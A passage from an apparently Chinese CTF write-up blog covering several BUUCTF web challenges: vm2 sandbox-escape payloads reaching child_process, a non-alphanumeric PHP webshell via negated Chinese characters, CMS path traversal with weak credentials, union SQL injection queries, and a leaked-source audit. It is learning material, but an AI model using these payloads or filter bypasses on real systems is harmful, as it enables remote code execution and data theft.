href="https://xz.aliyun.com/t/11859#toc-3">https://xz.aliyun.com/t/11859#toc-3</a></p><p>首先就是要通过奇怪的构造方式获取到全局process对象，这个全局对象下我们可以执行导入child_process，然后<code>require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()</code>进行命令执行了</p><p>看wp都是利用自执行函数 就是形如<code>(function()&#123;&#125;) 或 (function()&#123;&#125;)() </code>的表达式 ，被定义之后就会立即执行  </p><p>过滤了<code>[&#39;for&#39;, &#39;while&#39;, &#39;process&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;+&#39;, &#39;&quot;&#39;,&#39;&#39;&#39;]</code></p><p>然后poc都是在这里淘宝：<a href="https://github.com/patriksimek/vm2/issues">https://github.com/patriksimek/vm2/issues</a></p><p>通过模板字符串来bypass被waf的字符 其实本质就是格式化字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">console.<span class="title function_ invoke__">log</span>(`$&#123;`$&#123;`prototyp`&#125;e`&#125;`)</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(`$&#123;`prototype`&#125;`)</span><br><span class="line"></span><br><span class="line">等于prototype</span><br></pre></td></tr></table></figure><p>反引号来绕过单双引号</p><p>payload1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>.prototype.get_process = f=&gt;f.<span class="title function_ invoke__">constructor</span>(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Object.<span class="title function_ invoke__">preventExtensions</span>(Buffer.<span class="keyword">from</span>(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_ invoke__">get_process</span>(()=&gt;&#123;&#125;).mainModule.<span class="keyword">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_ invoke__">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_ invoke__">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>因为有waf所以要利用数组</p><p>看大佬wp</p><p><strong>当对象的方法或者属性名关键字被过滤的情况下可以利用数组调用的方式绕过关键字的限制</strong>  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?code[]=(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>.prototype.get_process = f=&gt;f.<span class="title function_ invoke__">constructor</span>(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Object.<span class="title function_ invoke__">preventExtensions</span>(Buffer.<span class="keyword">from</span>(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_ invoke__">get_process</span>(()=&gt;&#123;&#125;).mainModule.<span class="keyword">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_ invoke__">execSync</span>(<span class="string">&quot;ls&quot;</span>).<span class="title function_ invoke__">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>payload2就是利用模板字符串去bypass被waf的字符</p><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="keyword">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">untrusted</span> = <span class="string">&#x27;(&#x27;</span> + <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[`$&#123;`prototyp`&#125;e`][`$&#123;`get_proces`&#125;s`] = f=&gt;f[`$&#123;`constructo`&#125;r`](`<span class="keyword">return</span> this.$&#123;`proces`&#125;s`)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Object.<span class="title function_ invoke__">preventExtensions</span>(Buffer.<span class="keyword">from</span>(``)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[`$&#123;`get_proces`&#125;s`](()=&gt;&#123;&#125;).mainModule[`$&#123;`requir`&#125;e`](`$&#123;`child_proces`&#125;s`)[`$&#123;`exe`&#125;cSync`](`whoami`).<span class="title function_ invoke__">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(untrusted)</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(<span class="keyword">new</span> <span class="title function_ invoke__">VM</span>().<span class="title function_ invoke__">run</span>(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">    console.<span class="title function_ invoke__">log</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?code=(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[`$&#123;`prototyp`&#125;e`][`$&#123;`get_proces`&#125;s`] = f=&gt;f[`$&#123;`constructo`&#125;r`](`<span class="keyword">return</span> this.$&#123;`proces`&#125;s`)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Object.<span class="title function_ invoke__">preventExtensions</span>(Buffer.<span class="keyword">from</span>(``)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[`$&#123;`get_proces`&#125;s`](()=&gt;&#123;&#125;).mainModule[`$&#123;`requir`&#125;e`](`$&#123;`child_proces`&#125;s`)[`$&#123;`exe`&#125;cSync`](`ls`).<span class="title function_ invoke__">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>就暂时这样吧，做的云里雾里的。</p><h1 id="101、-GXYCTF2019-StrongestMind"><a href="#101、-GXYCTF2019-StrongestMind" class="headerlink" title="101、[GXYCTF2019]StrongestMind"></a>101、[GXYCTF2019]StrongestMind</h1><p>纯是考察python脚本</p><p>写个脚本爬下要求两个数字，计算，然后再post提交两个数字的结果，重复1000次。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688966691744-0ff8bc5e-3bdc-4fe4-9f4b-60e708c4cffd.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests import *</span><br><span class="line">import re</span><br><span class="line">s = <span class="title function_ invoke__">session</span>()</span><br><span class="line">a = s.<span class="title function_ invoke__">get</span>(<span class="string">&quot;http://6958b5bc-18e4-42b9-a6f1-aa7ac65e85b5.node4.buuoj.cn:81/index.php&quot;</span>)</span><br><span class="line">pattern = re.<span class="title function_ invoke__">findall</span>(r<span class="string">&#x27;\d+.[+-].\d+&#x27;</span>, a.text) </span><br><span class="line">c = <span class="keyword">eval</span>(pattern[<span class="number">0</span>])</span><br><span class="line">a = s.<span class="title function_ invoke__">post</span>(<span class="string">&quot;http://6958b5bc-18e4-42b9-a6f1-aa7ac65e85b5.node4.buuoj.cn:81/index.php&quot;</span>, data = &#123;<span class="string">&quot;answer&quot;</span> : c&#125;)</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1000</span>):</span><br><span class="line">pattern = re.<span class="title function_ invoke__">findall</span>(r<span class="string">&#x27;\d+.[+-].\d+&#x27;</span>, a.text) </span><br><span class="line">c = <span class="keyword">eval</span>(pattern[<span class="number">0</span>])</span><br><span class="line">  <span class="comment">//这里pattern=形如[&#x27;36328928 + 88301757&#x27;]是个list 那么可以用下标为0提出来36328928 + 88301757</span></span><br><span class="line"><span class="keyword">print</span>(c)</span><br><span class="line">a = s.<span class="title function_ invoke__">post</span>(<span class="string">&quot;http://6958b5bc-18e4-42b9-a6f1-aa7ac65e85b5.node4.buuoj.cn:81/index.php&quot;</span>, data = &#123;<span class="string">&quot;answer&quot;</span> : c&#125;)</span><br><span class="line"><span class="keyword">print</span>(a.text)</span><br></pre></td></tr></table></figure><p>重要的点就是 我们要记录1000次数 所以要保存上一次的状态，要保存一下session</p><p>请求的时候 session().get 或者 session().post 可以保持我们的会话状态session  并且发送不同的请求</p><p>又学到了！！</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688966946619-d0ce7ed6-e9a6-4c4d-96e9-5c89b18aed89.png" alt="img"></p><h1 id="102、-SUCTF-2018-GetShell"><a href="#102、-SUCTF-2018-GetShell" class="headerlink" title="102、[SUCTF 2018]GetShell"></a>102、[SUCTF 2018]GetShell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_char</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>先文件包含将我们的文件内容读入然后检查第六位开始的内容 </p><p>fuzz一下 看看哪些字符没有被waf</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688972164206-c84c4d71-7af7-405f-ab58-7a01382d8a3d.png" alt="img"></p><p><code>$()_[]~;.=</code>这些没有被waf 还有汉字 这道题目就是利用汉字按位取反来getshell的</p><p>这里有个很重要的一点 在爆破时候一定要把urlencode关了，不然提交的时候bp会将特殊的符号url编码从而使得fuzz出错 我第一次就是因为这个fuzz不全</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688972249693-0b95cade-1ab0-4116-a842-d40fec4f9ff3.png" alt="img"></p><p>先得到1和0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line"><span class="variable">$_</span>=[];             <span class="comment">//array</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>;         <span class="comment">//arrayarray </span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>);      <span class="comment">//不成立 false --&gt;0</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>);      <span class="comment">//成立   true  --&gt;1</span></span><br></pre></td></tr></table></figure><p>在PHP中两个空数组相互比较为true 所以值为1</p><p>那么该怎么得到字母呢 我们用汉字按位取反然后利用下标去截取我们需要的字符 这里最好选择的汉字去取反后能用的字符下标为0或者1  因为我们前面只构造出了01</p><p>可以参考p神的<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688973469139-4b68991a-fe08-469e-b040-80f76f3dbe3c.png" alt="img"></p><p>这样我们就可以截取一个php的p 当然这道题目我们没必要构造出php 用短标签就行了</p><p>所以最后payload可以构造很多方式  </p><p>偷的：<a href="https://blog.csdn.net/qq_46263951/article/details/118816182">https://blog.csdn.net/qq_46263951/article/details/118816182</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>                <span class="comment">//PHP中的另外一个短标签&lt;?=，代替&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];             <span class="comment">//array</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>;         <span class="comment">//arrayarray </span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>);      <span class="comment">//不成立 false --&gt;0</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>);      <span class="comment">//成立   true  --&gt;1</span></span><br><span class="line"><span class="variable">$___</span>=~区[<span class="variable">$__</span>].~冈[<span class="variable">$__</span>].~区[<span class="variable">$__</span>].~勺[<span class="variable">$__</span>].~皮[<span class="variable">$__</span>].~针[<span class="variable">$__</span>];  <span class="comment">//system</span></span><br><span class="line"><span class="variable">$____</span>=~码[<span class="variable">$__</span>].~寸[<span class="variable">$__</span>].~小[<span class="variable">$__</span>].~欠[<span class="variable">$__</span>].~立[<span class="variable">$__</span>];         <span class="comment">//_Post</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$$____</span>[~瞎[<span class="variable">$__</span>]]);   <span class="comment">//system($_POST[a]);</span></span><br></pre></td></tr></table></figure><p>打入 rce即可</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688973625307-c62c6cd1-194d-4b26-b8f8-ae282d9cc448.png" alt="img"></p><h1 id="103、-GKCTF-2021-easycms"><a href="#103、-GKCTF-2021-easycms" class="headerlink" title="103、[GKCTF 2021]easycms"></a>103、[GKCTF 2021]easycms</h1><p>看标题就知道是找后台 &#x2F;admin</p><p>但是这道题目是admin.php 然后登录 考察弱口令 admin&#x2F;12345就可以登录</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981688423-219797d3-2ce2-4788-a4df-421375f019df.png" alt="img"></p><p>可以看到是蝉知7.7的版本 那就直接检索这个版本的漏洞</p><p>但是这道题目buu靶场问题payload稍稍不同 导致花了好长时间一直卡在这</p><p>现在这里上传一个txt文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981793987-aa46eb16-b193-4fe8-932f-6cf3d7f8b04b.png" alt="img"></p><p>然后改名为：<code>../../../../../../../../../../../var/www/html/system/tmp/yzpc</code> </p><p>注意这里的最后的yzpc每个人不一样 我们进入后台之后进入设计-高级直接点保存会爆出一个路径 里面每个人不一样</p><p>就是这个路径和网上许多师傅复现的路径不一样 应该是靶场问题</p><p>好多师傅都是修改为：<code>../../../../../system/tmp/yzpc</code></p><p>但是这道题目要按我这种路径</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981807209-791e4185-75c6-437e-8e08-04ae2b6fe628.png" alt="img"></p><p>之后写入恶意代码即可</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981987225-574481c1-124f-4461-95da-7c07b5565c7e.png" alt="img"></p><p>还有一种就是我们上传完文件修改文件名以后在主题编辑里 编辑网站头部 直接写入php🐎即可</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688982259213-467c161b-a461-43d4-907c-dc982a85a45a.png" alt="img"></p><p>可以看到执行成功</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688982237616-df436f24-2567-4a63-83df-8ee981b28a72.png" alt="img"></p><h1 id="104、-b01lers2020-Life-on-Mars"><a href="#104、-b01lers2020-Life-on-Mars" class="headerlink" title="104、[b01lers2020]Life on Mars"></a>104、[b01lers2020]Life on Mars</h1><p>这道题难点还是在于怎么找到sql注入点 考察的只是联合注入 </p><p>进入网页 抓包分析 会发现有请求</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689042712077-67edce38-b96a-444a-bce5-62b0f91350dc.png" alt="img"></p><p>注入点如图</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689042755534-7ce030d7-56c5-4055-8095-8ec62023fbb5.png" alt="img"></p><p>构造<code>/query?search=amazonis_planitia%20union%20select%201,2 </code>发现有回显 有两列</p><p>然后就是联合注入常规操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/query?search=amazonis_planitia%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="title function_ invoke__">database</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当前库：aliens</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/query?search=amazonis_planitia%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="title function_ invoke__">group_concat</span>(table_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span>where%<span class="number">20</span>table_schema=<span class="string">&#x27;aliens&#x27;</span></span><br><span class="line"></span><br><span class="line">表：amazonis_planitia,arabia_terra,chryse_planitia,hellas_basin,hesperia_planum,noachis_terra,olympus_mons,tharsis_rise,utopia_basin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/query?search=amazonis_planitia%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="title function_ invoke__">group_concat</span>(column_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_name=<span class="string">&#x27;olympus_mons&#x27;</span></span><br></pre></td></tr></table></figure><p>注到这里 发现有很多表而且都没有flag</p><p>因此感觉flag不在当前库里 </p><p>再查一下所有库吧 原来在alien_code这个库里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/query?search=amazonis_planitia%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">20</span>group_concat(SCHEMA_NAME)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.SCHEMATA</span><br><span class="line">所有库：information_schema,alien_code,aliens</span><br><span class="line">/query?search=amazonis_planitia%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="title function_ invoke__">group_concat</span>(table_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span>where%<span class="number">20</span>table_schema=<span class="string">&#x27;alien_code&#x27;</span></span><br><span class="line"></span><br><span class="line">表：code</span><br><span class="line">/query?search=amazonis_planitia%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="title function_ invoke__">group_concat</span>(column_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_name=<span class="string">&#x27;code</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line">列：id,code</span><br><span class="line"></span><br><span class="line">/query?search=amazonis_planitia%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,code%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>alien_code.code</span><br><span class="line">这里要指定一下库 不然注不出来</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h1 id="105、-MRCTF2020-Ezaudit"><a href="#105、-MRCTF2020-Ezaudit" class="headerlink" title="105、[MRCTF2020]Ezaudit"></a>105、[MRCTF2020]Ezaudit</h1><p>之前就在buu上做过这类似的</p><p>首先进网页是一个花里胡哨的略过，然后扫后台发现源码泄露<code>/www.zip</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$Private_key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$username</span> == <span class="string">&#x27;&#x27;</span>) || (<span class="variable">$password</span> == <span class="string">&#x27;&#x27;</span>) ||(<span class="variable">$Private_key</span> == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$Private_key</span> != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Private_key</span> === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$getuser</span> = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        <span class="variable">$link</span>=<span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;test&quot;</span>,<span class="variable">$link</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$getuser</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$private_key</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$strings2</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$Public_key</span> = <span class="title function_ invoke__">public_key</span>();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p>第一部分是一个登录 第二部分是公私钥 